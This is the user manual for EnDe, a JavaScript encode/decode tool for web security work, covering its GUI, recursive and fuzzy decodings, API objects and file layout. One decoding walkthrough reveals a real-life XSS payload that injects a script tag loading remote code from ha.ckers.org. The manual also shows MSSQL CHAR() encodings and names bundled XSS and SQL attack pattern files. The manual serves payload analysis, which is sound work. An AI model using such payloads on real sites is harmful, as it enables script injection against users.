|	  EnDe.private_alert=function(x){alert('.private: '+x);}
+-
	* use [eval] action button (from "show results in ..")  to define this
	  function; if there is a JavaScript syntax error, a alert window will
	  appear with the error text:
		**EnDeGUI.FF.Dispatch: eval SyntaxError: ...
	  if no such alert popup appears, the function should be defined
	* use this function like:
+-
|	  EnDe.private_alert('heureca');
+-
	  or
+-
|	  EnDe.private_alert(EnDe.CONST.CHR.alnum);
+-
	  and hit [eval] button again
	
	These definitions are lost when the browser will be closed, that's why
	special [load] button exists to load function definitions from a file.
	The file content will be written to the  textarea field  where it then
	can be "eval"uated.
	Please save the function definitions yourself using your prefered text
	editor and copy & paste from the textarea.
	NOTE see  LIMITATIONS  also.
	
    REPLACE MAP
	
	Inset window shown with the [Replace Map] button from  GUI OPTIONS.  
	This windows defines a list of characters and their replacement. These
	replacements are used in the "Replace -> user" action of popup [clear]
	menu (below En-/Decoding textarea input field).
	
	These replacement mappings start below the [+] button. They consist of
	a checkbox, a label for the current line, the character to be replaced
	and the replacemnt (string) for that character.
		[x]  char1 [_old__] [_new__]
	When the  "Replace -> user" action is called,  each of the  characters
	will be replace with the specified replacement.  This is done globally
	on the specified string.
	
	The other elements in this window are:
	
	 "character encoding" radio buttons
		Speciefies the encoding (format) of a characters in all fields
		(old and new character and [add] character). Selecting another
		encoding, changes all already existing characters.
	
	 [+] button
		Adds a new line with input fields for old and new character.
	
	 [<>] button
		Exchanges all old with new characters.
	
	 [specials] button
		Menu with various  Unicode characters see  UNICODE MENU  below
		for details.  A selected character there  will be added to the
		specified input field (old or new character).
	
	 character [add] button
		The  selected character there  will be copied to the specified
		input field with the [add] button.
	
	NOTE: the selected encoding will be the  character(s) searched for and
	replaced. This means for example if the old character contains  '\x13'
	the user function searches for exact that string literal  and replaces
	it the with the string found in the new character input field.
	The different encodings are used for keying in any  Unicode character.
	If such a character should be searched for and replaced,  then set the
	"character encoding" to "char".
	
    UNICODE MENU
	
	This menu contains a selection of Unicode characters, mainly any sorts
	of brackets, spaces and slashes.
	As some (most) browsers have  problems displaying  some of the special
	characters, the display menu label consist of two parts separated by a
	colon.  Right to the colon the special character should be seen, while
	left to the colon a proper ASCII representation is shown. As the ASCII
	representation for any kind of space would be a space too, we use  '_'
	instead (the same for all spaces, obviously).
	
    TEXT MENU
	
	Below most input textarea fields  a [SELECT] menu  can be found, which
	mainly contains `text manipulation' actions.  They all change the text
	of the above textarea field.
	The name and the help text (tooltip) should be self-explanating.
	Each action in the "insert 2 UCS Characters" menu inserts the selected
	character sequence, which are 2 UCS characters aka 4 bytes,  where the
	first 3 bytes together are a valid UTF-8 character  and the  4'th byte
	is a normal US-ASCII character (ISO-8859-1).
	
	Just the actions groupd in "Recursive" are explained here:
	"%hx -> %%hxhx"
		Replaces all URL-encodings like  '%23' to '%%2323'.
	"%h23x -> %%h23xh23x"
		Replaces all URL-encodings like  '%1234' to '%%12341234'. This
		also substitutes  '%uHHHH' encodings.
	"&name; -> &&name;name;"
		Replaces all HTML-Entity-encodings:  '&gt;' to '&&gt;gt;'.
	"&#DD; -> &&#DD;#DD;"
		Replaces all decimal and hex HTML-Number-Entity-encodings.
	
	These actions can be called multiple times so that any recursion level
	is possible.
	
    CUSTOMIZE GUI
	
	Parts of the GUI can be customized by using private files.
	This works for all kinds of menus for actions. As these menus are read
	from ".txt" and/or ".xml" files, these files can be changed as needed,
	or better copied to the "./usr/" directory and changed there.
	Using the files from "./usr/" directory ensures, that they will not be
	overwritten by updates of EnDe .
	
	EnDe, when started, searches for files in "./usr/" directory first and
	uses them if found,  otherwise the given file (no  "./usr/" directory)
	will be used.
	
	There exists "./usr/EnDeMenu-Sample.txt"  which uses simplified  menus
	for actions. This is a sample to show how to modify menus.
	For testing simply rename it to "EnDeMenu.txt" and reload the page.
	
	This behaviour also allows to load files from "./usr/" directory first
	see  LOADING FILES.  
	
    EXAMPLES, HINTS
	
	Simulating other systems
	=======================================
	As already described in the  INTRODUCTION  , some function results may
	differ depending on the used tool.  There are various reasons why this
	can happen. EnDe can be tweaked to behave as other systems, so that it
	returns the same result for the same data.
	To explain that, we start with a simple practical example:
	* build MD5 hash as hex value for string "owasp"
		# type "owasp" (without double quotes) in Encoding textarea
		# select "Hash/Checksum -> MD5 (hex)"
	
	  which should return: 'E0ACA2FE8231010480C521FA93BC7EE6'.
	  Now try that in a shell on your prefered system (UNIX/Linux/OSX):
		% 'echo owasp | md5' (where some systems may use 'md5sum')
	  and you get '2bdce47b1a6c527b134d4b658b033702'
	
	  Why are the strings different? If 'echo -n owasp | md5' will be used
	  instead the result will be the same as in EnDe.  The reason for that
	  can be seen with  'echo owasp | od -x'  which shows that the shell's
	  'echo'  command added a newline 0x0a at the end of the string before
	  passing it to 'md5'.
	  Similar problems may occour, if we pipe the content of a file to the
	  'md5' command. The file may have different line endings (NL vs. CRNL
	  or final SUB characters).
	
	Another reason why results may be  different is that the tools get the
	characters in different formats, for example different character sets.
	The commonly used character sets  "ISO-8859-1", "UTF-8", "CP-1252" use
	different byte sequences for the same character.
	We explain that with an example again:
	* build base64 coding based on different character set
		# type "â‚¬uro" (without double quotes) in Encoding textarea
		# select "Base-N->Base64"
	
	  which should return: 'IKx1cm8='.  This is correct for text passed in
	  with charset Unicode (UCS-2).
	  The same example with text passed in as charset UTF-8 should return:
	  'KsdXJv'. Finally, if the charset is CP-1252, we get: 'gHVybw=='.
	
	Some charset conversions are implemented in EnDe. They can be found in
	The "Characters" menu and some others in the "Unicode/UTF" menu.
	
	NOTE:  the  "Characters" menu will be replaced by a more sophisticated
	solution in future.
	
	Multiple (recursive) encodings
	=======================================
	* recursive URL-encoding
	  Recursive encodings are  not standardised,  and hence  functions for
	  convertion do not exist. Though,  most such  recursive encodings can
	  simply be archived by pattern matching and text substitutions.
	  Such text substitutions (manipulations) are added to the  TEXT MENU.  
	  For example to convert 'magic=%27fool%27%3b'  to double  URL-encoded
	  'magic=%%2727fool%%2727%%3b3b', use "Recursive" -> "%hx -> %%hxhx".
	  It will result in 'magic=%%%272727fool%%%272727%%%3b3b3b' when using
	  the same action again.
	  It works the same way for converting '%u0027' to '%%u0027u0027', and
	  even HTML Entities (named and numbered character references like for
	  example converting 'magic=&apos;fool&apos;&semi;' to
	    'magic=&&apos;apos;fool&&apos;apos;&&semi;semi;'
	
	* double URL-encoding
	  Converting  '%27' to '%2527'  is done using proper  API OPTIONS  for
	  which a [User API Options] action exists: "%25HH double URL".
	
	
	Preset Options for En-/Decoding
	=======================================
	* Generating a MSSQL character sequence for string "Urgl" to produce
+-
|		CHAR(85) + CHAR(114) + CHAR(103) + CHAR(108)
+-
	  Options to be set:
	
		Set Values:     '1'
		Set Prefix:     'CHAR('
		Set Suffix:     ')'
		Set Delimiter:  '+'
		Use encoding:   "Straight > Decimal"
	
	* Decode MSSQL CAST() value
+-
|		CAST(0x4400450043004C00410052004500 AS NVARCHAR(4000))
+-
	  Copy the value  '4400450043004C00410052004500' (without '0x') to the
	  Decoding textarea. Then set following values:
	
		Set Values:     '2'
		Set Prefix:     ''
		Set Suffix:     ''
		Set Delimiter:  ''
		Use decoding:   "Straight > Hex"
	
	  Finally use  '\0' from text manipulation menu in Encoding textarea.
	
	* See the [User API Options] menu above for more such examples.
	
	* See  COMMON FUNCTIONS  section above for converting 2 byte values to
	  Unicode characters.

	  can be decoded as follows:
		# copy payload to the decoding texarea
		# select "Remove -> non-printable ASCII" in menu below textarea
		# manually remove all characters left to 'top'
		# select "Fuzzy decoding-> \-escaped in'" decoding
	  The result now shows the decoded string:
+-
|		top['eval']('document.writeln('< body>< script src="//ha.ckers.org/s">
|		< /script>< /body>');');
+-
	
	* Multi-level decoding 3
	  Same example as above, but using [Functions].
		# copy payload to the decoding texarea
		# select "\n" in menu below textarea
		# select "\t" in menu below textarea
		# select "space" in menu below textarea
		# select "clear" in options section to reset the input fields
		# select "size: 3" in options
		# add '\' for "Prefix" in options
		# click the [Functions] button (a inset window opens)
		# select "URL/URI->Url(%XX)" decoding
		# select "Straight->Octal" decoding
	<!-- this initial TAB to make HTML conversion more pretty -->
	  Now try to evaluate the generated code with the provided data, using
	  [Scratchpad] button for example,  but it bails out  with a couple of
	  decoding errors. Not very nice at first glance.
	  So we add some cleanup as follows:
		# use  [parsed] button in  FUNCTIONS  inset window, which then
		  results in a more (human) readable code
		# navigate to the first closing bracket (near line 13) and add
		  the JavaScript code  '.substr(23)' right before the ',' .
		  The code should now look like:
+-
|		  EnDe.DE.dispatch(
|		      "oct3",
|		      "lazy",
|		      $('EnDeDOM.API.uppercase').value,
|		      ""+EnDe.DE.dispatch(
|			    "urlCHR",
|			    "lazy",
|			    $('EnDeDOM.API.uppercase').value,
|			    $('EnDeDOM.DE.text').value,
|			    $('EnDeDOM.API.prefix').value,
|			    $('EnDeDOM.API.suffix').value,
|			    $('EnDeDOM.API.delimiter').value
|		      ).substr(23),
|		      $('EnDeDOM.API.prefix').value,
|		      $('EnDeDOM.API.suffix').value,
|		      $('EnDeDOM.API.delimiter').value
|		  )
+-
		(we used '$()' as alias for 'document.getElementById()')
		# evaluate with [scratchpad] button or [alert] button again
	  The result now shows the decoded string:
+-
|		evaldocument.writeln('< body>< script src="//ha.ckers.org/s">< /script>< /body>');
+-
	
	  To show what else is possible, we start again  with copying the text
	  to the Decoding textarea,  but do not select '\n'  which removes the
	  newlines, instead in the  FUNCTIONS  inset window we add:
+-
|		.substr(23).replace(/\n/g,'')
+-
	  instead of '.substr(23)'.
	  Some of the parameters can also be hardcode passed to the functions,
	  therefore use for example "Prefix" from select menu to  replaces all
	   'EnDeDOM.API.prefix.value'  variables with the string '"\\"'
	  (doesn't matter that all occourances of  this variable  are replaced
	  in this example, however).
	  Finally  we see that all the configurations in the  FUNCTIONS  inset
	  window can be omitted if we just insert the  function code as listed
	  above.
	  Conclusion: the function code can be saved and used later as needed.
	
	  It's still  not perfect  for this real  life example as the  "octal"
	  decoding silently ignored some characters but it gives an impression
	  what can be done (well, there is still something to improve:).
	
	* Multi-level de- and encoding
	  This example shows how to decode a string, change a value,  and then
	  encode it as before.

	* Fuzzy decoding
	  This examples demonstrates how to use some of the fuzzy decodings.
	  Following payloads as example:
+-
|		CHR(105)+CHR(116)+CHR(032)+CHR(119)+CHR(111)+CHR(114)+CHR(107)+CHR(115)+CHR(033)
+-
+-
|		CHR(105116)+CHR(032)+CHR(119111114107115)+CHR(033)
+-
	  The steps:
		# from [User API Options] menu select "CHR()+ Oracle"
		# copy payload to the decoding texarea
		# select "Fuzzy decoding->Dezimal using Options" decoding
	
	* Fuzzy decoding long strings
+-
|		0x697420776F726B73
+-
	  The steps:
		# from [User API Options] menu select "0x00HH 0x-prefixed"
		# copy payload to the decoding texarea
		# select "Fuzzy decoding->Hex using Options" decoding
		# or select "Straight->Hex String" decoding
	
	* Fuzzy decoding hex to characters
+-
|		0x3c646561643e,0x3c626565663e
+-
	  converts to '0x< dead>0x< beef>'
	  The steps:
		# copy payload to the decoding texarea
		# select "Fuzzy decoding->Hex using Options" decoding
	
	* Fuzzy decoding hex to characters
+-
|		0x3c646561643e,0x3c626565663e
+-
	  converts to '< dead>< beef>'
	  The steps:
		# Options to be set:
		  Set Values:     '2'
		  Set Prefix:     '0x'
		  Set Suffix:     ''
		  Set Delimiter:  ','
		# copy payload to the decoding texarea
		# select "Fuzzy decoding->Hex using Options" decoding
		# or select "Straight->Hex String" decoding
	
	  NOTE that some actions in "Fuzzy decoding"  use the same function as
	  in "Straight"  decoding menu.  For example  "Straight->Octal String"
	  is the same function as "Fuzzy decoding->Octal using Options".
	
	* Fuzzy decoding hint
	  If you need to decode a string  where no preset functions  for fuzzy
	  decoding assists directly, then  simply try to enclose the string to
	  be decoded in some kind of  quotes and brackets, in particular those
	  which are not used itself in the string.
	  Also consider to use the "values selection" checkbox from the
	  GUI OPTIONS.  
	
	Building test cases on the fly
	=======================================
	Test patterns and  correponding test cases with their expected results
	can  be defined in the  Encoding textarea.  The [run tests from input] 
	button then can perform the specified tests (see  DETAILS Test section
	for more details on testing).
	The patterns and test definitions  must comply to syntax  specified in
	"EnDeTest-Sample.txt". It's recomended to load a  "EnDeTest*.txt" file
	into the Encoding textarea and modify it as desired.
	
	It should be possible to generate such test patterns using with user
	functions specified in the Functions inset window.

    LIMITATIONS
	
	Even the charset is UTF-8 in all files and forms, browsers usually use
	Unicode internally  for processing the content of the fields.  This is
	in particular true when the text is processed with JavaScript.
	I. g. this works with all browsers flawless,  but you have to be aware
	about this behaviour in particular when using copy & paste.
	UTF-8 is used when making the HTTP request and a server should respond
	with Character-Set:UTF-8.
	
	Hence it highly depends on your browser configuration and your browser
	implementation what happens with none-US-ASCII characters keyed in.
	
	Modern browsers support  Unicode characters (code points)  from ranges
	which need 2 USC-2 characters aka 4 bytes.   Even browsers may display
	them correctly, EnDe is not able to convert them because it treats the
	2 UCS-2 characters idependently. However, for some conversions they're
	converted to CESU-8 representation.  This is not correct, but accepted
	in some applications.
	
	NOTE:  EnDe never makes HTTP requests except when initially loaded, or
	the [reload] button in the  BROWSER QUIRKS  inset window is used.
	Loading files is done using JavaScript's 'XMLHttpRequest()',  which may
	make HTTP requests depening on the given path or URL.
	
	"Load Local File"
		Loading files will work only for files from the same origin as
		"index.html" itself. The Same Origin Policy restricts this.
	
    KNOWN GUI PROBLEMS
	
	Currently (04/2011, 1.0rc5) only minor GUI problems are knonw:
	* Chromium (all versions) - throws error when XHR uses file:///...
	* Google Chrome (all versions) - throws error when XHR uses file:///...
		workaround: commandline option: --allow-file-access-from-files
		details see: http://code.google.com/p/chromium/issues/detail?id=47416 
	* "core-rules-2.0.xml"    - throws error in some browsers
		workaround: use "core-rules-2.0-part1.xml", "core-rules-2.0-part2.xml"
	* Opera < 10.0  - does not allow onChange on select tags
		workaround: use Opera or noClick option, see  BROWSER QUIRKS  
	* WebKit-based browsers on Windows don't support the 'title' attribute
		for  'OPTION' tags, hence no description avaialable there
	* Epiphany (all versions)  - some menus and checkboxes are incorrectly
		displayed
	
    BROWSER QUIRKS
	
	The  Browser Quirks inset window is an attempt to provide  workarounds
	for the most common problems (at least known ones) in some browsers.
	It contains a general description  and a detailed description for each
	setting there.
	All the settings are passed to EnDe as special parameters in the URL's
	search part. Hence some settings require a reload of the page.
	Though, these settigs can be given to the URL at the initial call too.
	
	Browser Quirks does not provide workarounds per browser,  but tries to
	provide a workaround  per problem.  This allows to combine them all as
	needed. It should be easy to find a solution for each specific problem
	according the description given by each setting. Just try it.
	
	Other known problems (mainly ancient browsers) are described in:
		http:EnDe.man.html?EnDe.bug.txt#GUI 
	
URL OPTIONS
	
	Following options are available in the URL's search part:
	* Test          - show Test section for testing "EnDe.js" itself
	* status        - show Status Bar
	* experimental  - show features which are implemented experimental
	* trace         - show trace section
	* userdebug     - like  'trace',  but with additional information
	* nousr         - do not read files from "./usr/" directory
	* Opera         - mainly workaround for display quirks of this browser
	* Safari        - mainly workaround for display quirks of this browser
	* Chrome        - mainly workaround for display quirks of this browser
	* Camino        - mainly workaround for display quirks of this browser
	* Konqueror     - mainly workaround for display quirks of this browser
	* Webkit        - mainly workaround for display quirks of this browser
	* iCab          - mainly workaround for display quirks of this browser
<!-- * Mozilla       - mainly workaround for display quirks of this browser -->
	
	These options can be combined in any sequence, for example:
	
+-
|		?Test&status&trace
+-
	
	More such options can be found in the  BROWSER QUIRKS  inset window.
	
	
API
	
	The library used for the actions consist of following files:
	
	* "EnDe.js"
	* "EnDeMaps.js"
	* "crc.js"
	* "aes.js"
	* "md4.js"
	* "md5.js"
	* "rmd.js"
	* "sha.js"
	* "sha512.js"
	* "blowfish.js"

	* "EnDeFunc.txt"
	* "EnDeFunc.js"
	* "EnDeFunc.html"
	* "EnDeCheck.js"
	* "EnDeUser.js"
	
	These files can be used without all other files anywhere.  Anything is
	encapsulated in objects so that there should not be any name-space  or
	name conflict (except the object names itself, obviously).
	
    API OBJECTS
	
	Each en-, decoding, conversion utility has its own object. The objects
	are:
	
	* 'EnDe'        - global container object
	* 'EnDe.CONST'  - used constants
	* 'EnDe.CH'     - all about characters
	* 'EnDe.ED'     - all about coding, encoding, decoding
	* 'EnDe.EN'     - all encoding functions
	* 'EnDe.DE'     - all decoding functions
	* 'EnDe.IP'     - all IP related functions
	* 'EnDe.TS'     - all timestamp conversion functions
	* 'EnDe.B64'    - all Base64 related functions
	* 'EnDe.UCS'    - all Unicode related functions
	* 'EnDe.IDN'    - all IDN and puny code related functions
	* 'EnDe.CRC'    - all CRC functions
	* 'EnDe.AES'    - all AES functions
	* 'EnDe.SHA'    - all SHA functions
	* 'EnDe.MD4'    - all MD4 functions
	* 'EnDe.MD5'    - all MD5 functions
	* 'EnDe.RMD'    - all RIPEMD-160 functions
<!--	* 'EnDe.RE'     - all regular expression related functions -->
	
	For a detailed description of these objects see  the definition of the
	object itself in "EnDe.js" and "EnDeRE.js".
	
	Most of these objects provides a  'dispatch()' function  for a unified
	access to all functions of the corresponding object.
	
	The API is available as  http:EnDe.lib.tgz
	
    API FUNCTIONS
	
	A brief description of all functions is available in http:EnDeFunc.js
	and http:EnDeFunc.html .
	
    KNOWN API PROBLEMS
	
	See http:EnDe.man.html?EnDe.bug.txt#API
	
	
HACKER's INFO
	
    General
	
	As  anything is implemented in  JavaScript,  we need to  remember that
	JavaScript is based on Unicode, this means that all data being handled
	by JavaScript is assumed to be Unicode.
	These functions should work  flawless if they are feed with such  data
	*and* EnDe is installed as desribed in  INSTALLATION  above.
	Anyway, beside the installation, anything should work flawless for all
	printable ASCII characters (except the listed  KNOWN PROBLEMS  and
	  LIMITATIONS  ). For more coding hints, see  Unicode/UTF-8  below.
	
    JavaScript Versions
	
	All JavaScript code relies on  ECMA-262  standard (ECMAScript v3). For
	example the code relies on some behaviors according Arrays and Objects
	specified there (which violates implementations in some browser namely
	Netscape 4.x).
	Hence the includes of the scripts should be done using:
+-
|	< script language="JavaScript1.3" text="text/javascript" src"...." >< /script>
+-
	Only the files for the browser GUI and some 3'rd party tools require
	
+-
|	< script language="JavaScript1.5" text="text/javascript" src"...." >< /script>
+-
	because they use:
+-
|	try {...} catch(e) {...}
+-
	These files are:
	* "EnDeGUI.js"
	* "EnDeRE.js"
	* "EnDeREGUI.js"
	* "EnDeTest.js"
	* "EnDeUser.js"
	* "JsColorizer.js"
	* "JsDecoder.js"
	* "JSReq.js"
	
	I. g. it should work with JavaScript1.3 anywhere as the used try-catch
	blocks are for defensive programming only (to catch buggy browsers :).
<!--
	Except in "EnDeUser.js" where  'try {...}' is used to check if objects
	contain properties.
-->
	
    API files:
	
	For a brief description of the  functions available in the  API, refer
	to  API FUNCTIONS  above.
	
	EnDe consist of following files (or is one single file which was built
	from these files):

	* "EnDeGUI.js", "EnDeMenu.txt"
		'EnDeGUI' creates the (action) menus defined in "EnDeMenu.txt"
		for the user interface of "index.html". It also contains global
		'*.dipatcher()' for all other functions.  And it provides some
		simple functions itself.
	* "EnDeGUIx.js"
		Part of "EnDeGUI.js" using its own file for better maintanance.
	* "EnDeText.js"
		Text manipulation functions, mainly used in "EnDeGUI.js".

	* "Makefile.in"
		** experimental **
		Makefile for future hackers ;-)
	
    GUI menu files:
	
	Following files are used for building menus in the GUI only:
	
	* "EnDeSamp.xml"
		A sample .xml file to describe the syntax in there; not used.
	* "./usr/EnDeMenu-Sample.txt"
		A sample for a user-definable "EnDeMenu.txt"; not used.
	* "EnDeOpts.txt"
		Builds the [User API Options] menu in the GUI OPTIONS section.
	* "EnDeFile.txt"
		Builds the [Menu] menu in the GUI OPTIONS section.
	* "xss.h4k.xml", "xssAttacks.xml", "xss.mario.xml", "sqlPattern.xml"
		 Special menus to be loaded by [create menu] menu.
	* "core-rules.xml", "core-rules-2.0.xml"
		ModSecurity's Core Rule Set (will be added to RegEx).
		This files were built using:
+-
|		java -jar CoreRules2Html.jar core-rules.xml modsecurity-core-rules-x.y.z.tar.gz
+-
	* "default_filter.xml"
		PHPIDS's filter rules (will be added to RegEx).

		File containing all  API functions used with  [Shuffle] button
		and "EnDe funtions" menu in functions inset window.
		(generated by EnDe2xml.pl)
	* "EnDeUser.xml"
		File containing user-defined functions for the functions inset
		window.
		New functions can be added in this file.
	
	Following files if found in the "usr/" directory  will be used instead
	their original ones (as provided by each EnDe release):
	* "usr/EnDeMenu.txt"
	* "usr/EnDeMaps.txt"
	* "usr/EnDeFile.txt"
	* "usr/EnDeOpts.txt"
	* "usr/EnDeCheck.txt"
	* "usr/EnDeUser.xml"
	* "usr/sqlPattern.xml"
	
	These files are never distributed with an EnDe release, and so are not
	overwritten with new releases.  These files are supposed to be used to
	customize the GUI by the user.
	
	Following files are  not used directly.  They are used as  simple text
	source for generating the corresponding .xml file.
	* "sqlPattern.txt"
	
	Obsolete files starting with version 1.0:
	
	Obsolete files starting with version 0.1.69:
	* "EnDeOpts.xml"
		(generated by opt2xml.pl from "EnDeOpts.txt")
	* "EnDeFile.xml"
	* "checksum.xml"
	
    USER file EnDeUser.js:
	
	This file contains user-defined functions.
	Currently (04/2011) following user functions are implemented here:
	
	* 'EnDe.User.DE.vs'         - parse ASP.NET 1.x and 2.0 viewstate data
	* 'EnDe.User.EN.vs'         - fold parsed ASP.NET 1.x viewstate data
	* 'EnDe.User.DAT.isXXXX'    - return true if data in requested format
	* 'EnDe.User.DAT.guess'     - try to identify data format
	* 'EnDe.User.IMG.isXXXX'    - return true if data in requested format
	* 'EnDe.User.IMG.guess'     - try to identify image format
	* 'EnDe.User.IMG.getMIME64' - get MIME type for Base64 encoded image data
	* 'EnDe.User.Check.dispatch'- dispatcher for functions in "EnDeCheck.js"
	* 'EnDe.User.Check.quess'   - guessing checksums
	* 'EnDe.User.init'          - initialize user data
	<!-- This file will not be changed in future. -->
	
    USER file EnDeCheck.js:
	
	This file contains functions for checksums.
	Currently (04/2011) following checksum functions are available:
	
	* 'EnDe.Check.D5'   - Verhoeff's Dihedral Group D5 Check algorithm
	* 'EnDe.Check.EFT'  - Electronic Funds Transfer Routing Number Check
	* 'EnDe.Check.UPC'  - Universal Product Code
	* 'EnDe.Check.EAN'  - European Article Numbering (aka GS1, GLN, IAN)
	* 'EnDe.Check.GLN'  - Global Location Numbering (aka GTIN, ILN)
	* 'EnDe.Check.ISBM' - ISBN numbers (aka IBM mod 11 algorithm)
	* 'EnDe.Check.Luhn' - Luhn (aka IBM) algorithm
	* 'EnDe.Check.CC'   - check IIN - Issuer Identification Number
	* 'EnDe.Check.SSN'  - check (US) social security number
	* 'EnDe.Check.Byte1'- one byte checksum
	
	For each check following functions are implemented:
	
	* 'get()'           - compute the checksum value
	* 'is()'            - check if number has valid checksum
	* 'valid()'         - check if number contains valid checksum
	* 'code()'          - check if number matches some special data
	
	These functions are implemented as  "user functions"  because they are
	neither encoding nor decoding. They also return a value (like 'get()')
	or just  true/false.
	These functions do not change the  En- or Decoding textarea but show a
	popup window instead.  This behaviour can simply be changed by editing
	the  'dispatch()' function in "EnDeUser.js".
	That's why the menu for  these functions is not visible by default but
	must be added with the [Menu] button (see  GUI OPTIONS  above).
	
	The implementation is as follows:
	
	* core functionality (API) in "EnDeCheck.js"
	* 'EnDe.User.Check.dispatch()'  in  "EnDeUser.js" to be called by GUI
	* menu definition for functions  available in GUI in  "EnDeCheck.txt",
		  hence it must be enabled with  GUI OPTIONS  .
	
	A simple GUI for testing is available in  http:EnDeCheck-Test.html .
	
    OTHER FILES
	
	Following files are not yet (06/2010) used and just for documentation:
	
	* "xss-evation.txt" - file with various XSS patterns
	
	These files cannot be used to build menus,  but may be loaded into any
	of the input fields using the [>Encoding], [>Decoding] etc. buttons.
	Or they can be loaded into their own window using the  [show payloads] 
	button.
	
    GUI MENUS
	
	There're 2 possibilities to build menus:
	
	# using tab-separated text in  "*.txt"  files and building the menu in
	  'EnDeGUI.init()' and/or  'EnDeGUI.makemenu()'.
	# using XML in whatever file and adding that file to "EnDeFile.txt"
	
	With the first -text- method it is more comfortable to define the menu
	as simple text,  but requires programming in  'init()'.  Alternatively
	 'makemenu()' may be used. These menus are highly customizable.
	The second -XML- method is more cumbersome as 2 files need to be setup
	correctly: the ".xml" file containing the menu and "EnDeFile.txt"  but
	has the advantage that no additional programming is necessary.
	
	The text method is prefered for the built-in menus.  The XML method is
	used for building user-definable menus. All menus in all tool sections
	are built from text. Some menus in  GUI OPTIONS  and  API OPTIONS  are
	built from XML, as they are subject to user customization.
	
	New menus can be added anywhwere to the GUI,  see [create menu] button
	for "Load File" [Menu]. See  LOADING FILES  for more details.
	
	All menu files found in "usr/" directory are used instead the original
	one found in "./". These files can be used to customize the GUI.
	
	Please see
	* http:EnDe.man.html?forcetxt&EnDeSamp.xml
		for a detailed description about the syntax in ".xml" files
	* http:EnDe.man.html?forcetxt&EnDeMenu.txt
		for a detailed description about the syntax in ".txt" files.
	
	Example
	=======================================
	To understand how this works, simply do following:
	
	# copy an existing  .xml  file, for example  "sqlPattern.xml" to a new
	  file, for example "my.xml"
	# select the object where you want to add the menu
	# add "my.xml" to the file input field
	# hit return (or the [create menu] button)
	
	Though, even it is possible,  it does not yet make sense to add a menu
	to some of the listed tools.
	
    HELP FILES
	
	All help texts are organized as plain text files.
	A JavaScript function in  "EnDe.man.html" can be used to display these
	texts in HTML style. Therefore the text in these files  need to comply
	to some rules:
	
	* a line with just capital letters is a head line
	* lines starting with * are unnumbered lists
	* lines starting with # are numbered lists
	* strings enclosed in double quotes (") are emphased
	* strings enclosed in single quotes (') are printed in code style
	* text quoted like `quoted text' are displayed as is (literal text)
	* block boxes for code start with a single  +-  line and end with  +-
	* lines starting with | are part of code boxes
	* text like `[text]' are shown in button style: [text]
	* text like `[42]' are shown in super position and used as reference
	* due to limitations in HTML syntax, tags cannot be written  verbatim,
		  workaround: the leading <. needs to be followed by one space
	* lines starting with a tab followed by spaces will force a line break
		  if used inside lists (dirty hack, will be removed in future)
	* all  `http://xxxx' texts are links to external files: http://xxxx 
	* all  `http:xxxx 'texts are links to lokal files: http:xxxx 
	* a string with capital letters enclosed with  2 spaces on  both sides
		  is a refernces to anchors (head line) in the page itself
		  (if such a reference is at the end of the line, the trailing
		   2 spaces must be present too due to  parsing limitations)
	* empty lines  should have at least one tab  (this is a workaround for
	  buggy browsers which do not support 'white-space:pre;' styles)
	
	In  some browsers (namely all Mozilla/Firefox), conversion from  plain
	text to HTML is dreadful slow (200 times --in words: two hundred-- and
	more compared to WebKit-based browsers).
	
<!-- NOT YET IMLEMENTED
* [x] NAME        -> (literal x) <input type=checkbox> NAME
* (x) NAME        -> (literal x) <input type=radiobox> NAME
  -->
	
    JavaScript and DOM Objects
	
	All variables and functions are encapsulated in objetcs. These objects
	are:

	* 'EnDe'    - all variables and functions used in the  API  
	* 'EnDeGUI  - all variables and functions used in the  GUI  
	* 'EnDeRE   - all variables and functions used in the Regex GUI
	
    XMLHttpRequest()
	
	The javaScript function 'XMLHttpRequest()' is used to read an external
	file.  It can read XML files and return a corresponding DOM, or it can
	read any text file and return the text as is.
	There're  no browser detections and hence  different implementaions of
	'XMLHttpRequest()' are not supported.
	The function is also called in synchronous mode only, which avoids the
	definition of a seperate handler function.  Further processing  of the
	read file content can be done by calling a proper function right after
	the reading function complets.
	
    Same Origin Policy
	
	Note that files to be loaded into the browser need to be read from the
	local file system, means that the current URI is of the form:
		'file:///.... .html'
	otherwise  most browsers  would not load the file but bail out with an
	error due to the  same origin policy violation.  That's why some files
	are provided with this distribution.  The original file (or an updated
	one) also can be loaded with the provided menu from the  corresponding
	web site (but the same origin policy counts again).
	However, some browsers can be tweaked to read cross-domain files also.
	
	The  same origin policy applies to the  'XMLHttpRequest()' function as
	well as the browser's build-in file selection box.
	
	Using  EnDe from the local file system with  'file:///.... .html' will
	avoid most of the same origin policy problems.
	See  KNOWN GUI PROBLEMS  also.
	
    Unicode/UTF-8
	
	The primary list of all characters is defined in "EnDeMaps.txt". These
	are simple text based maps (see description there) which are stored in
	JavaScript hashes by the code in "EnDeMaps.js".  The hashes (maps) are
	used then in  all (most)  en-, decoding and conversion functions, this
	means that these functions are data-driven. However there're also some
	algorithmic functions like those in the  'EnDe.UCS.' object:  'h2f()',
	'f2h()', 'utf16le()', 'utf16be', 'utf32le()', 'utf32be'.
	
	Some special Unicode characters, which are used to build menus, can be
	found in "EnDeMaps.txt" also, see  UNICODE MENU  for details.
	
    Development Hints
	
	How to find out which functions are called?
	=======================================
	Start EnDe with the '?trace' option, then check the  Trace tool after
	calling the function.
	
	What exactly is the syntax for calling functions?
	=======================================
	Best you use the functionality provided by the inset window shown with
	the [Functions] button. Then select your function from any menu in the
	GUI (see  MODE  above).
	
    Development
	
	A "Makefile" for traditional `make' provides some often used tasks.
	Simply calling
+-
|		make
+-
	shows a brief usage of the targets in the Makefile. If in doubt, start
	make with the  '-n'  option to see what would be done.

EPILOG
	
	This project was started after  struggling with a  number of tools and
	realizing that most (all?) of them (see  LINKS  above) did not do what
	You/I want. The  INTRODUCTION  show more detailled examples.
	It seems to be a neverending story to find something  where you simply
	can TU WAS DU WILLST ... [1]  which is the  motto of  "The Neverending
	Story" [2]  by Michael Ende [3]  and is a nice allegory to the goal to
	achieve here.
	
	That was in early 2007.
	While implementing the various features as you see them now, there was
	some spare time to do something just for fun. That's why you find some
	codings, you won't expect in practical applications --call them easter
	eggs, if you like.
	
	In May 2008 we read about XSS with/in Morse code [4].  That's funny at
	first view only. But if you're aware about the threats  with something
	simple like XSS, you'd take this seriously too.
	There was no need to add Morse code to EnDe's list of coding functions
	as it already was there. But I removed the  JOKES  section (see easter
	eggs above) herein, as it comes out again that en-/decoding  becomes a
	neverending story, see  EPILOG  ...
	
<!--	Let's see when problems occour with some other functions already
	implemented herein ... -->
